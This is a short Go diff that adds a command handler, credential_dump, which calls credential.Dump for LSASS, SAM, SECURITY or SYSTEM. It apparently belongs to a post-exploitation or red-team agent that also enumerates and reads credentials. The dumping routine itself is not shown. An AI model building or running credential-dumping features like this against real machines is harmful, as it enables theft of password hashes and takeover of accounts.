@@ -26,6 +26,18 @@ func handleCredentialEnum(_ context.Context, _ string) (string, error) {
 	return marshalJSON(credential.Enumerate(username, home, os.Environ()))
 }
 
+func handleCredentialDump(_ context.Context, args string) (string, error) {
+	kind := strings.TrimSpace(args)
+	if kind == "" {
+		return "", fmt.Errorf("credential_dump requires lsass, sam, security, or system")
+	}
+	result, err := credential.Dump(kind)
+	if err != nil {
+		return "", err
+	}
+	return marshalJSON(result)
+}
+
 func handleCredentialRead(_ context.Context, args string) (string, error) {
 	path := strings.TrimSpace(args)
 	data, err := credential.ReadSecret(path, maxCredentialRead)
